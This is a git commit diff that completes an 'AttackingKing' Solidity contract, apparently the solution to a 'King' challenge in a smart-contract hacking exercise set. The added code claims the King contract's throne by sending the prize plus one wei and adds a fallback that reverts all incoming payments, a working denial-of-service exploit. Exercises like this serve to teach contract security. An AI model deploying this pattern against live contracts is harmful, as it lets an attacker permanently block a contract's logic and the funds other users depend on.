fa9c2bb799741d55eb8cf96efbba9f4910597127
maks-p <mpazuniak@gmail.com>
2022-07-21 08:15:12 -0400

    Complete King

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -3,8 +3,10 @@ pragma solidity ^0.8.9;
 import "./King.sol";
 import "hardhat/console.sol";
 
+error AttackingKing__UnsuccessfulCall();
 contract AttackingKing {
     address public contractAddress;
+    King king;
 
     constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
@@ -12,5 +14,17 @@ contract AttackingKing {
 
     function hackContract() external {
         // Code me!
+        king = King(payable(contractAddress));
+        uint256 prize = king._prize();
+        
+        (bool success, ) = payable(king).call{value: prize + 1}("");
+        
+        if (!success) {
+            revert AttackingKing__UnsuccessfulCall();
+        }
+    }
+
+    fallback() external payable {
+        revert("Refusing all transfers!");
     }
 }
